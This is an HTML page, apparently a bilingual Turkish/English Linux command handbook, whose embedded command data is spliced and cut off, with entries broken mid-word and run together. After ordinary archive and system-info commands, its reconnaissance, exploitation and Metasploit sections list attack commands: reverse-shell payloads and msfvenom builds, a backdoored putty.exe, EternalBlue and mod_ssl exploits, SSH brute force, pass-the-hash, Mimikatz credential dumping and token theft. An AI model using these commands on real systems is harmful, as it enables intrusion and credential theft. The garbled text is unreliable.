<!DOCTYPE html>
<html lang="tr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Linux Komut El Kitabı</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,700&family=JetBrains+Mono:wght@400;700&family=Syne:wght@600;700;800&display=swap"
    rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'DM Sans', sans-serif;
    }

    body {
      background-color: #0a0a0f;
      color: #e5e7eb;
      transition: background-color 0.3s, color 0.3s;
      overflow-x: hidden;
      position: relative;
    }

    body.theme-light {
      background-color: #f5f3ff;
      color: #1e1b4b;
    }

    h1,
    h2,
    h3,
    h4,
    h5,
    h6 {
      font-family: 'Syne', sans-serif;
    }

    code,
    pre {
      font-family: 'JetBrains Mono', monospace;
    }

    #bg-mesh {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      z-index: -1;
      background: radial-gradient(circle at 15% 50%, rgba(124, 58, 237, 0.08), transparent 25%), radial-gradient(circle at 85% 30%, rgba(168, 85, 247, 0.08), transparent 25%);
      animation: mesh 20s infinite alternate;
    }

    body.theme-light #bg-mesh {
      background: radial-gradient(circle at 15% 50%, rgba(124, 58, 237, 0.15), transparent 25%), radial-gradient(circle at 85% 30%, rgba(168, 85, 247, 0.15), transparent 25%);
    }

    @keyframes mesh {
      0% {
        transform: scale(1);
      }

      100% {
        transform: scale(1.1);
      }
    }

    #progress-bar {
      position: fixed;
      top: 0;
      left: 0;
      width: 0%;
      height: 3px;
      background: linear-gradient(90deg, #7c3aed, #a855f7);
      z-index: 1000;
      transition: width 0.1s;
    }

    nav {
      position: sticky;
      top: 0;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 1rem 2rem;
      background: rgba(10, 10, 15, 0.7);
      backdrop-filter: blur(10px);
      border-bottom: 1px solid rgba(124, 58, 237, 0.2);
      z-index: 100;
      transition: all 0.3s;
    }

    body.theme-light nav {
      background: rgba(245, 243, 255, 0.7);
      border-bottom: 1px solid rgba(124, 58, 237, 0.1);
    }

    .nav-brand {
      font-size: 1.5rem;
      font-weight: 800;
      color: #a855f7;
      display: flex;
      align-items: center;
      gap: 0.5rem;
      font-family: 'Syne', sans-serif;
    }

    .nav-actions {
      display: flex;
      align-items: center;
      gap: 1rem;
    }

    button {
      background: none;
      border: none;
      cursor: pointer;
      color: inherit;
      transition: all 0.2s;
      font-family: inherit;
    }

    .btn-icon {
      padding: 0.5rem;
      border-radius: 0.5rem;
      display: flex;
      align-items: center;
      justify-content: center;
      background: rgba(124, 58, 237, 0.1);
    }

    .btn-icon:hover {
      background: rgba(124, 58, 237, 0.2);
    }

    .search-container {
      position: relative;
    }

    #search-input {
      padding: 0.5rem 1rem 0.5rem 2.5rem;
      border-radius: 0.5rem;
      border: 1px solid rgba(124, 58, 237, 0.3);
      background: rgba(10, 10, 15, 0.5);
      color: #fff;
      width: 250px;
      outline: none;
      transition: all 0.2s;
      font-family: inherit;
    }

    body.theme-light #search-input {
      background: rgba(255, 255, 255, 0.5);
      color: #000;
    }

    #search-input:focus {
      border-color: #a855f7;
      box-shadow: 0 0 0 2px rgba(168, 85, 247, 0.2);
      width: 300px;
    }

    .search-icon {
      position: absolute;
      left: 0.75rem;
      top: 50%;
      transform: translateY(-50%);
      opacity: 0.5;
    }

    main {
      display: flex;
      max-width: 1400px;
      margin: 0 auto;
      padding: 2rem;
      gap: 2rem;
      min-height: 80vh;
    }

    aside {
      width: 250px;
      flex-shrink: 0;
    }

    .category-list {
      position: sticky;
      top: 100px;
      display: flex;
      flex-direction: column;
      gap: 0.5rem;
      max-height: calc(100vh - 120px);
      overflow-y: auto;
      padding-right: 0.5rem;
    }

    .category-list::-webkit-scrollbar {
      width: 6px;
    }

    .category-list::-webkit-scrollbar-track {
      background: rgba(0, 0, 0, 0.1);
      border-radius: 4px;
    }

    .category-list::-webkit-scrollbar-thumb {
      background: rgba(124, 58, 237, 0.3);
      border-radius: 4px;
    }

    .category-list::-webkit-scrollbar-thumb:hover {
      background: rgba(124, 58, 237, 0.6);
    }

    .category-btn {
      text-align: left;
      padding: 0.75rem 1rem;
      border-radius: 0.5rem;
      font-weight: 500;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .category-btn:hover,
    .category-btn.active {
      background: rgba(124, 58, 237, 0.1);
      color: #a855f7;
    }

    .badge {
      background: rgba(124, 58, 237, 0.2);
      padding: 0.1rem 0.4rem;
      border-radius: 1rem;
      font-size: 0.75rem;
      font-family: 'JetBrains Mono', monospace;
    }

    .content {
      flex-grow: 1;
    }

    .category-section {
      margin-bottom: 4rem;
      scroll-margin-top: 100px;
    }

    .category-title {
      font-size: 2rem;
      margin-bottom: 1.5rem;
      color: #a855f7;
      border-bottom: 1px solid rgba(124, 58, 237, 0.2);
      padding-bottom: 0.5rem;
      font-family: 'Syne', sans-serif;
    }

    .commands-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
      gap: 1.5rem;
    }

    .command-card {
      background: rgba(30, 27, 75, 0.4);
      border: 1px solid rgba(124, 58, 237, 0.1);
      border-radius: 1rem;
      padding: 1.5rem;
      backdrop-filter: blur(10px);
      transition: all 0.3s;
      opacity: 0;
      transform: translateY(20px);
      display: flex;
      flex-direction: column;
      gap: 1rem;
    }

    body.theme-light .command-card {
      background: rgba(255, 255, 255, 0.6);
      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
    }

    .command-card.visible {
      opacity: 1;
      transform: translateY(0);
    }

    .command-card:hover {
      border-color: #a855f7;
      box-shadow: 0 0 15px rgba(124, 58, 237, 0.15);
      transform: translateY(-2px);
    }

    .cmd-header {
      display: flex;
      align-items: baseline;
      gap: 1rem;
    }

    .cmd-name {
      font-size: 1.25rem;
      color: #a855f7;
      background: rgba(124, 58, 237, 0.1);
      padding: 0.25rem 0.5rem;
      border-radius: 0.25rem;
      font-family: 'JetBrains Mono', monospace;
    }

    .cmd-desc {
      font-size: 0.95rem;
      opacity: 0.9;
      flex-grow: 1;
    }

    .cmd-section-title {
      font-size: 0.75rem;
      text-transform: uppercase;
      letter-spacing: 0.05em;
      opacity: 0.5;
      margin-bottom: 0.5rem;
      font-weight: 700;
    }

    .code-block {
      background: rgba(0, 0, 0, 0.5);
      padding: 1rem;
      border-radius: 0.5rem;
      position: relative;
      border: 1px solid rgba(255, 255, 255, 0.05);
    }

    body.theme-light .code-block {
      background: #1e1b4b;
      color: #e5e7eb;
      border: none;
    }

    .code-block pre {
      overflow-x: auto;
      font-size: 0.85rem;
      padding-right: 2.5rem;
      color: #fff;
    }

    body.theme-light .code-block pre {
      color: #fff;
    }

    .copy-btn {
      position: absolute;
      right: 0.5rem;
      top: 0.5rem;
      background: rgba(255, 255, 255, 0.1);
      padding: 0.25rem;
      border-radius: 0.25rem;
      opacity: 0;
      transition: opacity 0.2s;
      color: #fff;
    }

    .code-block:hover .copy-btn {
      opacity: 1;
    }

    .copy-btn:hover {
      background: rgba(255, 255, 255, 0.2);
    }

    .ex-list {
      display: flex;
      flex-direction: column;
      gap: 1rem;
    }

    .ex-item-desc {
      font-size: 0.85rem;
      margin-bottom: 0.25rem;
      opacity: 0.8;
    }

    .ex-item .code-block {
      padding: 0.75rem;
    }

    .ex-item .code-block pre {
      font-size: 0.85rem;
      color: #a855f7;
    }

    #no-results {
      display: none;
      text-align: center;
      padding: 4rem;
      font-size: 1.5rem;
      opacity: 0.5;
      grid-column: 1 / -1;
      font-family: 'Syne', sans-serif;
    }

    #scroll-top {
      position: fixed;
      bottom: 2rem;
      right: 2rem;
      background: #a855f7;
      color: #fff;
      width: 3rem;
      height: 3rem;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 4px 12px rgba(124, 58, 237, 0.4);
      opacity: 0;
      pointer-events: none;
      transition: all 0.3s;
      z-index: 100;
    }

    #scroll-top.visible {
      opacity: 1;
      pointer-events: auto;
    }

    #scroll-top:hover {
      transform: translateY(-5px);
      background: #9333ea;
    }

    .highlight {
      background: rgba(168, 85, 247, 0.4);
      color: inherit;
      padding: 0 0.2rem;
      border-radius: 0.2rem;
    }

    .footer-banner {
      margin-top: 4rem;
      padding: 2rem;
      text-align: center;
      background: linear-gradient(to right, rgba(30, 27, 75, 0.8), rgba(10, 10, 15, 0.8));
      border-top: 1px solid rgba(124, 58, 237, 0.2);
      backdrop-filter: blur(10px);
    }

    body.theme-light .footer-banner {
      background: linear-gradient(to right, rgba(245, 243, 255, 0.8), #fff);
    }

    .credit-link {
      display: inline-flex;
      align-items: center;
      gap: 0.5rem;
      color: #a855f7;
      text-decoration: none;
      font-weight: 700;
      font-size: 1.2rem;
      padding: 1rem 2rem;
      border-radius: 2rem;
      background: rgba(124, 58, 237, 0.1);
      transition: all 0.3s;
      font-family: 'Syne', sans-serif;
    }

    .credit-link:hover {
      background: #a855f7;
      color: #fff;
      transform: translateY(-2px);
      box-shadow: 0 4px 15px rgba(168, 85, 247, 0.3);
    }

    .credit-card {
      text-align: center;
      padding: 3rem;
      background: rgba(30, 27, 75, 0.2);
      border-radius: 1rem;
      border: 1px solid rgba(124, 58, 237, 0.2);
      margin-top: 4rem;
      backdrop-filter: blur(10px);
    }

    body.theme-light .credit-card {
      background: rgba(255, 255, 255, 0.6);
    }

    .credit-card h2 {
      margin-bottom: 1.5rem;
      color: #a855f7;
      font-size: 2rem;
    }

    @media (max-width: 1024px) {
      main {
        flex-direction: column;
      }

      aside {
        width: 100%;
      }

      .category-list {
        position: static;
        flex-direction: row;
        flex-wrap: wrap;
      }

      .category-btn {
        flex-basis: calc(50% - 0.5rem);
      }

      .commands-grid {
        grid-template-columns: 1fr;
      }

      #search-input {
        width: 200px;
      }

      #search-input:focus {
        width: 250px;
      }
    }

    @media (max-width: 768px) {
      nav {
        flex-direction: column;
        gap: 1rem;
        padding: 1rem;
      }

      .nav-actions {
        width: 100%;
        justify-content: space-between;
        flex-wrap: wrap;
      }

      .search-container {
        flex-grow: 1;
        margin-right: 0;
        width: 100%;
        order: 3;
      }

      #search-input {
        width: 100%;
      }

      #search-input:focus {
        width: 100%;
      }

      .category-btn {
        flex-basis: 100%;
      }
    }
  </style>
</head>

  <script>

es in a ZIP archive.", "syntax": "unzip file[.zip]", "ex": [{ "c": "unzip archive.zip", "tr": "ZIP dosyasını çıkar", "en": "Extract ZIP file" }] }, { "name": "bzip2", "tr": "Blok sıralamalı dosya sıkıştırıcı.", "en": "A block-sorting file compressor.", "syntax": "bzip2 [filenames...]", "ex": [{ "c": "bzip2 file.txt", "tr": "Dosyayı bz2 olarak sıkıştır", "en": "Compress file as bz2" }] }, { "name": "xz", "tr": "XZ ve LZMA sıkıştırma aracı.", "en": "Compress or decompress .xz and .lzma files.", "syntax": "xz [option...]  [file...]", "ex": [{ "c": "xz file.txt", "tr": "Dosyayı xz ile sıkıştır", "en": "Compress file with xz" }] }, { "name": "7z", "tr": "Yüksek sıkıştırma oranlı dosya arşivleyici.", "en": "A file archiver with highest compression ratio.", "syntax": "7z <command> <archive_name> [<file_names>...]", "ex": [{ "c": "7z a archive.7z folder/", "tr": "7z arşivi oluştur", "en": "Create 7z archive" }] }, { "name": "cpio", "tr": "Dosyaları kopyalar ve arşiv oluşturur.", "en": "Copy files to and from archives.", "syntax": "cpio [OPTION...] [destination-directory]", "ex": [{ "c": "ls | cpio -ov > archive.cpio", "tr": "Cpio arşivi oluştur", "en": "Create cpio archive" }] }, { "name": "dd", "tr": "Dosya dönüştürür ve kopyalar (genellikle imaj almak için).", "en": "Convert and copy a file.", "syntax": "dd [OPERAND]...", "ex": [{ "c": "dd if=/dev/sda of=backup.img", "tr": "Diskin imajını al", "en": "Create disk image" }] }, { "name": "zstd", "tr": "Zstandard - Hızlı gerçek zamanlı sıkıştırma algoritması.", "en": "Zstandard - Fast real-time compression algorithm.", "syntax": "zstd [OPTIONS] [-|INPUT-FILE] [-o OUTPUT-FILE]", "ex": [{ "c": "zstd file.txt", "tr": "Dosyayı zstd ile sıkıştır", "en": "Compress file with zstd" }] }] }, { "cat": "systemInfo", "cmds": [{ "name": "uname", "tr": "Sistem bilgilerini yazdırır.", "en": "Print system information.", "syntax": "uname [OPTION]...", "ex": [{ "c": "uname -a", "tr": "Tüm sistem bilgilerini göster", "en": "Show all system info" }] }, { "name": "uptime", "tr": "Sistemin ne kadar süredir çalıştığını söyler.", "en": "Tell how long the system has been running.", "syntax": "uptime [options]", "ex": [{ "c": "uptime", "tr": "Çalışma süresini göster", "en": "Show uptime" }] }, { "name": "free", "tr": "Boş ve kullanılan bellek miktarını gösterir.", "en": "Display amount of free and used memory in the system.", "syntax": "free [options]", "ex": [{ "c": "free -h", "tr": "Bellek kullanımını göster", "en": "Show memory usage" }] }, { "name": "lscpu", "tr": "CPU mimarisi hakkında bilgi gösterir.", "en": "Display information about the CPU architecture.", "syntax": "lscpu [options]", "ex": [{ "c": "lscpu", "tr": "İşlemci detaylarını göster", "en": "Show CPU details" }] }, { "name": "lsblk", "tr": "Blok cihazları listeler.", "en": "List block devices.", "syntax": "lsblk [options] [device...]", "ex": [{ "c": "lsblk", "tr": "Disk bölümlerini listele", "en": "List disk partitions" }] }, { "name": "lshw", "tr": "Donanım konfigürasyonunu listeler.", "en": "List hardware configuration.", "syntax": "lshw [ -format ] [ -options ...  ]", "ex": [{ "c": "sudo lshw -short", "tr": "Kısa donanım özeti göster", "en": "Show short hardware summary" }] }, { "name": "dmidecode", "tr": "Bilgisayarın DMI tablo içeriklerini çözer.", "en": "DMI table decoder.", "syntax": "dmidecode [OPTIONS]", "ex": [{ "c": "sudo dmidecode -t memory", "tr": "RAM bilgilerini göster", "en": "Show RAM info" }] }, { "name": "dmesg", "tr": "Çekirdek ring tamponunu yazdırır veya kontrol eder.", "en": "Print or control the kernel ring buffer.", "syntax": "dmesg [options]", "ex": [{ "c": "dmesg | tail", "tr": "Son çekirdek loglarını göster", "en": "Show latest kernel logs" }] }, { "name": "journalctl", "tr": "Systemd loglarını sorgular.", "en": "Query the systemd journal.", "syntax": "journalctl [OPTIONS...]", "ex": [{ "c": "journalctl -u nginx", "tr": "Nginx loglarını göster", "en": "Show nginx logs" }] }, { "name": "vmstat", "tr": "Sanal bellek ista şilebilir yap", "en": "Make file accessible for apache" }] }, { "name": "restorecon", "tr": "Varsayılan SELinux güvenlik bağlamlarını geri yükler.", "en": "Restore default SELinux security contexts.", "syntax": "restorecon [options] pathname...", "ex": [{ "c": "restorecon -v /var/www/html/index.html", "tr": "Bağlamı orijinaline döndür", "en": "Restore context to original" }] }, { "name": "auditctl", "tr": "Çekirdeğin audit (denetim) sistemini yapılandırır.", "en": "A utility to assist controlling the kernel's audit system.", "syntax": "auditctl [options]", "ex": [{ "c": "auditctl -l", "tr": "Tüm aktif denetim kurallarını listele", "en": "List all active audit rules" }] }] }, { "cat": "reconnaissance", "cmds": [{ "name": "netdiscover", "tr": "Ağdaki cihazları ARP istekleri ile keşfeder (OSI Katman 2).", "en": "Discover devices on network using ARP requests (OSI Layer 2).", "syntax": "netdiscover [options]", "ex": [{ "c": "netdiscover -r 192.168.1.0/24", "tr": "Belirtilen IP aralığını aktif olarak tara", "en": "Actively scan the specified IP range" }, { "c": "netdiscover -p", "tr": "Pasif tarama (sniffing) modu (daha sinsi)", "en": "Passive scanning mode (stealth)" }] }, { "name": "arp-scan", "tr": "Yerel ağdaki cihazları hızlıca tespit eden Layer 2 tarayıcı.", "en": "Layer 2 scanner to quickly detect devices on local network.", "syntax": "arp-scan [options]", "ex": [{ "c": "arp-scan -l", "tr": "Yerel ağı otomatik tara (localnet)", "en": "Scan local network automatically (localnet)" }] }, { "name": "nikto", "tr": "Web sunucusu zafiyet tarayıcısı.", "en": "Web server vulnerability scanner.", "syntax": "nikto [options]", "ex": [{ "c": "nikto -h http://example.com", "tr": "Temel zafiyet taraması başlat", "en": "Start basic vulnerability scan" }, { "c": "nikto -h http://example.com -Tuning 9", "tr": "Sadece SQL Injection (SQLi) zafiyetlerini ara", "en": "Scan for SQLi vulnerabilities only" }, { "c": "nikto -h 10.10.10.10 -useproxy http://127.0.0.1:8080", "tr": "Burp Suite name": "SNMP Numaralandırması", "tr": "Simple Network Management Protocol üzerinden ağ cihazları ve sunuculardan detaylı bilgi çekme.", "en": "Extracting detailed info from network devices and servers via Simple Network Management Protocol.", "syntax": "snmpwalk / snmp-check", "ex": [{ "c": "snmpwalk -c public -v1 192.168.1.10", "tr": "SNMP v1 kullanarak 'public' community dizgisi ile ağdaki tüm bilgileri dök.", "en": "Extract all network info using SNMP v1 with 'public' community string." }, { "c": "snmp-check 192.168.1.10", "tr": "SNMP verilerini insan okuyabileceği kategorize edilmiş bir formatta (Kullanıcılar, IP'ler, Portlar) raporlar.", "en": "Reports SNMP data in a highly readable and categorized format (Users, IPs, Ports)." }] }, { "name": "FTP Numaralandırması (Nmap)", "tr": "Nmap NSE scriptleri kullanarak FTP sunucuları hakkında detay toplama (Önceki Metasploit ftp modülüne alternatiftir).", "en": "Detail gathering about FTP servers using Nmap NSE scripts (Alternative to Metasploit ftp module).", "syntax": "nmap -p 21 --script=ftp-*", "ex": [{ "c": "nmap -p 21 --script=ftp-anon 192.168.1.10", "tr": "Sadece FTP portunu tara ve Anonymous (şifresiz) girişe izin verip vermediğini kontrol et.", "en": "Scan only FTP port and check if Anonymous login is allowed." }] }] }, { "cat": "exploitation", "cmds": [{ "name": "msfconsole", "tr": "Metasploit Framework komut satırı arayüzü.", "en": "Metasploit Framework command line interface.", "syntax": "msfconsole [options]", "ex": [{ "c": "msfconsole -q", "tr": "Sessiz başlat (banner olmadan)", "en": "Start quietly (without banner)" }, { "c": "use exploit/multi/http/navigate_cms_rce", "tr": "Navigate CMS RCE modülünü seç", "en": "Select Navigate CMS RCE module" }, { "c": "set payload linux/x86/shell_reverse_tcp", "tr": "Non-staged reverse shell payload'u ayarla", "en": "Set non-staged reverse shell payload" }] }, { "name": "php-reverse-shell", "tr": "Hedef sunucudan saldırgana terminal bağlantısı açan script (pentestmonkey).", "en": "Script that opens a reverse shell from target to attacker.", "syntax": "php-reverse-shell.php", "ex": [{ "c": "nc -lvnp 1234", "tr": "Gelecek bağlantıyı beklemek için kendi makinenizde dinleyici başlat", "en": "Start listener on your machine for incoming connection" }] }, { "name": "OpenFuck", "tr": "Apache mod_ssl (OpenSSL v2) buffer overflow exploiti.", "en": "Apache mod_ssl (OpenSSL v2) buffer overflow exploit.", "syntax": "./OpenFuck <target_id> <ip> <port> -c <connections>", "ex": [{ "c": "./OpenFuck 0x6a 192.168.1.10 443 -c 40", "tr": "Hedefe HTTPS üzerinden buffer overflow çalıştır (root shell sağlar)", "en": "Run buffer overflow over HTTPS on target (gives root shell)" }] }, { "name": "AutoBlue-MS17-010", "tr": "MS17-010 (EternalBlue) açığı için otomatikleştirilmiş exploit seti.", "en": "Automated exploit toolkit for MS17-010 (EternalBlue).", "syntax": "python [script] <ip>", "ex": [{ "c": "python eternal_checker.py 192.168.1.10", "tr": "Açığa karşı zafiyet taraması yap", "en": "Scan for vulnerability" }, { "c": "python zzz_exploit.py 192.168.1.10", "tr": "Stabil (mavi ekran riski düşük) Named Pipe exploit kullan", "en": "Use stable Named Pipe exploit (low BSOD risk)" }] }, { "name": "pwn_jenkins", "tr": "Jenkins otomasyon sunucuları için RCE ve sömürü aracı.", "en": "RCE and exploitation tool for Jenkins servers.", "syntax": "python [script].py [args]", "ex": [{ "c": "python jenkins_rce_admin_script.py", "tr": "Groovy script ile RCE/shell al", "en": "Get RCE/shell via Groovy script" }, { "c": "python jenkins_dump_builds.py", "tr": "Build loglarını çek (api anahtarları vb. sızdırmak için)", "en": "Dump build logs (to leak api keys etc.)" }] }, { "name": "Hedef: OpenSSH (Targeting OpenSSH)", "tr": "SSH servisine yönelik numaralandırma ve kaba kuvvet (Brute-Force) saldırıları.", "en": "Enumeration and brute-force attacks targeting the SSH service.", "syntax": "hydra / nmap", "ex": [{ "c": "hydra -L users.txt -P passwords.txt ssh://192.168.1.10", "tr": "Hydra kullanarak belirli bir kullanıcı ve şifre listesiyle SSH kaba kuvvet saldırısı yap.", "en": "Perform an SSH brute-force attack using Hydra with specified user and password lists." }] }, { "name": "Hedef: MySQL Veritabanı (Targeting MySQL)", "tr": "MySQL veritabanı sunucusuna yönelik numaralandırma, şifre kırma ve komut çalıştırma.", "en": "Enumeration, password cracking, and command execution targeting MySQL database server.", "syntax": "nmap / mysql", "ex": [{ "c": "nmap -p 3306 --script=mysql-enum,mysql-brute 192.168.1.10", "tr": "Nmap NSE scriptleri ile MySQL numaralandırması ve şifre kırma saldırısı yap.", "en": "Perform MySQL enumeration and password cracking using Nmap NSE scripts." }, { "c": "mysql -u root -p -h 192.168.1.10 -e 'show databases;'", "tr": "Ele geçirilen şifreyle MySQL'e uzaktan bağlan ve veritabanlarını listele.", "en": "Connect to MySQL remotely with cracked password and list databases." }] }, { "name": "Hedef: vsFTPd (Targeting vsFTPd)", "tr": "vsFTPd sunucularına yönelik zafiyet sömürüsü ve numaralandırma.", "en": "Vulnerability exploitation and enumeration targeting vsFTPd servers.", "syntax": "nmap / metasploit", "ex": [{ "c": "nmap -p 21 --script=ftp-vsftpd-backdoor 192.168.1.10", "tr": "Hedefteki vsFTPd servisinin bilinen backdoor (arka kapı) zafiyetine sahip olup olmadığını Metasploit açmadan tara.", "en": "Scan if the target's vsFTPd service has the known backdoor vulnerability without opening Metasploit." }] }] }, { "cat": "metasploit", "cmds": [{ "name": "MSF ile Numaralandırma (Scanner)", "tr": "Metasploit'in 'auxiliary' modülleri ile hedeften FTP, SMB, SSH, MySQL veya Web dizinleri hakkında bilgi toplama.", "en": "Gathering info about FTP, SMB, SSH, MySQL or Web directories from target using Metasploit's 'auxiliary' modules.", "syntax": "use auxiliary/scanner/[protokol]/[modül]", "ex": [{ "c": "use auxiliary/scanner/ftp/anonymous\nset RHOSTS 192.168.1.10\nrun", "tr": "FTP Anonim Giriş ve Numaralandırma: Hedefte parolasız (anonymous) FTP girişinin açık olup olmadığını test eder.", "en": "FTP Anonymous Login & Enum: Checks if anonymous FTP login is allowed on the target." }, { "c": "use auxiliary/scanner/smb/smb_version\nset RHOSTS 192.168.1.0/24\nrun", "tr": "SMB Numaralandırması: Ağdaki makinelerin işletim sistemi ve tam SMB versiyonlarını tarar.", "en": "SMB Enumeration: Scans OS and detailed SMB versions of machines on the network." }, { "c": "use auxiliary/scanner/ssh/ssh_version\nset RHOSTS 192.168.1.10\nrun", "tr": "SSH Numaralandırması: SSH servisinin tam versiyon bilgisini (banner grabbing) çeker.", "en": "SSH Enumeration: Grabs the SSH service banner and version info." }, { "c": "use auxiliary/scanner/mysql/mysql_version\nset RHOSTS 192.168.1.10\nrun", "tr": "MySQL Numaralandırması: Hedef veritabanı sunucusunun versiyon bilgisini elde eder.", "en": "MySQL Enumeration: Gets the version info of the target database server." }, { "c": "use auxiliary/scanner/http/dir_scanner\nset RHOSTS 192.168.1.10\nrun", "tr": "Website Numaralandırması: Hedef web sunucusundaki gizli dizinleri brute-force yöntemiyle arar.", "en": "Website Enumeration: Brute-forces hidden directories on the target web server." }] }, { "name": "Zafiyet Taraması (Vulnerability Scan)", "tr": "Sistemdeki güvenlik açıklarını Metasploit scanner modülleri veya eklentilerle otomatik tarama.", "en": "Automated scanning for security vulnerabilities using Metasploit scanner modules or plugins.", "syntax": "search type:auxiliary name:scanner", "ex": [{ "c": "use auxiliary/scanner/smb/smb_ms17_010\nset RHOSTS 192.168.1.10\nrun", "tr": "Hedefin MS17-010 (EternalBlue) zafiyetine karşı savunmasız olup olmadığını tarar (Exploit etmez, sadece tarar).", "en": "Scans if target is vulnerable to MS17-010 (EternalBlue) (Does not exploit, only scans)." }, { "c": "load wmap\nwmap_sites -a http://hedef.com\nwmap_targets -t http://hedef.com\nwmap_run -e", "tr": "WMAP Eklentisi: Web uygulamasına tam otomatik zafiyet taraması başlatır.", " Bash shell handles environment variables." }, { "c": "use exploit/windows/iis/iis_webdav_upload_asp\nset RHOSTS 192.168.1.10\nexploit", "tr": "WebDAV Sömürüsü: Yanlış yapılandırılmış (yazma izni PUT/MOVE olan) WebDAV sunucusuna zararlı ASP yükleyip shell alma.", "en": "WebDAV Exploit: Uploading malicious ASP to misconfigured WebDAV (PUT/MOVE allowed) to get shell." }] }, { "name": "İleri Seviye Taktikler (Pass The Hash & BadUSB)", "tr": "Hash atlatma saldırıları ve fiziksel sızma (Rubber Ducky) için payload oluşturma.", "en": "Pass the Hash attacks and generating payloads for physical breaches (Rubber Ducky).", "syntax": "msfconsole / msfvenom", "ex": [{ "c": "use exploit/windows/smb/psexec\nset SMBPass [LM_Hash]:[NTLM_Hash]\nset SMBUser Administrator\nexploit", "tr": "Hash'i Atlatma Saldırısı (Pass The Hash): Şifrenin aslını (plaintext) bilmeden, yakalanan hash değerini doğrudan kullanarak sisteme yönetici girişi yapma.", "en": "Pass The Hash: Logging into the system using only the captured hash value without knowing the plaintext password." }, { "c": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f psh-cmd", "tr": "Rubber Ducky için Payload: Zararlı USB takıldığında klavye gibi davranıp bu kodları çok hızlı yazarak (PowerShell In-Memory) cihaza sızar.", "en": "Rubber Ducky Payload: Acts as keyboard when malicious USB inserted, typing these codes very fast (PowerShell In-Memory) to breach device." }] }, { "name": "PsExec ile SMB İstismarı", "tr": "Geçerli bir kullanıcı adı ve şifre/hash ile hedefte uzaktan komut çalıştırma (Sysinternals PsExec mantığı).", "en": "Remote command execution using valid credentials or hashes (Sysinternals PsExec logic).", "syntax": "use exploit/windows/smb/psexec", "ex": [{ "c": "use exploit/windows/smb/psexec\nset RHOSTS 192.168.1.10\nset SMBUser admin\nset SMBPass şifre\nexploit", "tr": "Geçerli kimlik bilgileriyle hedefe bağlan ve 'SYSTEM' yetkisinde meterpreter shell al.", "en": "Connect to target with valid credentials and get 'SYSTEM' meterpreter shell." }] }, { "name": "MSFVenom Yük Oluşturma (Payload Gen)", "tr": "Antivirüsleri atlatmak veya hedefe özel zararlı yazılım oluşturmak için kullanılan bağımsız araç.", "en": "Standalone tool used to generate custom payloads or evade antiviruses.", "syntax": "msfvenom -p [payload] LHOST=[IP] -f [format]", "ex": [{ "c": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe > shell.exe", "tr": "Standart bir Windows (.exe) ters bağlantı (reverse shell) yükü oluştur.", "en": "Generate a standard Windows (.exe) reverse shell payload." }] }, { "name": "Taşınabilir Dağıtımlara (PE) Yük İliştirme", "tr": "MSFVenom ile temiz ve yasal bir programın (örn: putty.exe) içine zararlı kod gömme (Backdooring).", "en": "Embedding malicious code into a clean, legitimate executable (e.g. putty.exe) using MSFVenom.", "syntax": "msfvenom -x [temiz_exe] -p [payload] -f exe -o [zararli_exe]", "ex": [{ "c": "msfvenom -x putty.exe -k -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o putty_zararli.exe", "tr": "Putty programının orijinal yapısını bozmadan (-k) içine gizli meterpreter bağlantısı ekle.", "en": "Inject hidden meterpreter into Putty without breaking its original functionality (-k)." }] }, { "name": "Erişim Token'i Taklidi (Token Impersonation)", "tr": "Sistemde açık olan diğer yetkili kullanıcıların (örn: Domain Admin) kimlik fişlerini (token) çalarak o kullanıcıymış gibi davranma.", "en": "Stealing active access tokens of privileged users (e.g. Domain Admin) to act as them.", "syntax": "load incognito", "ex": [{ "c": "load incognito\nlist_tokens -u", "tr": "Meterpreter içindeyken Incognito modülünü yükle ve çalınabilecek yetkili token'ları listele.", "en": "Load Incognito in Meterpreter and list available privileged tokens to steal." }, { "c": "impersonate_token 'NT AUTHORITY\\SYSTEM'", "tr": "Sistem (Root) yetkili token'ı taklit et ve en yüksek yetkilere eriş.", "en": "Impersonate System token to gain highest privileges." }] }, { "name": "Mimikatz ile Hash Boşaltma (Dumping)", "tr": "Windows RAM'inde (LSASS) tutulan şifreleri (açık metin veya hash) çekmek için kullanılan en ünlü araç.", "en": "Most famous tool to extract passwords (plaintext or hash) stored in Windows RAM (LSASS).", "syntax": "load kiwi", "ex": [{ "c": "load kiwi\ncreds_all", "tr": "Meterpreter üzerinden Mimikatz (Kiwi) yükle ve hafızadaki tüm şifreleri/hash'leri çek.", "en": "Load Mimikatz (Kiwi) via Meterpreter and dump all credentials/hashes from memory." }, { "c": "lsa_dump_sam", "tr": "Windows SAM veritabanındaki tüm yerel kullanıcıların NTLM hash'lerini dök.", "en": "Dump NTLM hashes of all local users from Windows SAM database." }] }, { "name": "Resource Script ile MSF Otomasyonu", "tr": "Metasploit komutlarını tek tek yazmak yerine bir dosyadan (.rc) otomatik okutarak çalıştırma (Otomasyon).", "en": "Running Metasploit commands automatically from a file (.rc) instead of typing them one by one (Automation).", "syntax": "msfconsole -r [script.rc]", "ex": [{ "c": "echo -e 'use exploit/multi/handler\\nset PAYLOAD windows/meterpreter/reverse_tcp\\nset LHOST 0.0.0.0\\nset LPORT 4444\\nexploit -j' > dinleyici.rc", "tr": "Sürekli elle girilen Dinleyici ayarlarını içeren bir resource script (.rc) dosyası oluştur.", "en": "Create a resource script (.rc) file containing constantly manually entered listener settings." }, { "c": "msfconsole -q -r dinleyici.rc", "tr": "Metasploit'i sessizce başlat ve dinleyici komutlarını otomatik olarak arka planda çalıştır.", "en": "Start Metasploit quietly and run the listener commands automatically in the background." }] }, { "name": "WinRM Açığı 